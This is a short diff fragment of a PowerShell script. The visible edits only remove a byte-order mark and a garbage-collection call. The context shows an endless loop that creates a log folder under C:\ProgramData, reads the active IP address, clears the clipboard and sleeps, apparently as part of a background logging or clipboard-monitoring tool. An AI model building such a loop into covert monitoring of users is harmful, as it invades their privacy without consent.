@@ -1,4 +1,4 @@
-﻿do {
+do {
 if(!(test-path 'C:\ProgramData\soalog'))
 {new-item -Path "C:\ProgramData\soalog" -ItemType Directory -Force }
 $IP = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.netadapter.status -ne "Disconnected"}).ipv4address.ipaddress
@@ -110,7 +110,7 @@ sleep 3
 Set-Clipboard -Value $Null
 
 }
-[System.GC]::Collect()
+
 sleep 1
 } 
 while ($true)
